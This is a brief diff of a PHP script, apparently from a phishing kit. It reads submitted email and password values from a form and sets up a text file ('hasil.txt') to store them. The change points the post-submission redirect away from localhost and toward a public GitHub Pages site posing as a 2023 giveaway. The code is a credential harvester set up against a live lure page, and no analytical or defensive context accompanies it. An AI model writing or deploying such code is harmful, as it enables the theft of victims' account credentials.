@@ -1,5 +1,5 @@
 <?php
-header ("Location: http://localhost/masterpro/FormMasuk.html");
+header ("Location: https://giveawayberbagi.github.io/giveawayberbagi2023/FormMasuk.html");
 $ADEx = "hasil.txt";
 $ADEy = $_POST['email'];
 $ADEz = $_POST['pass'];
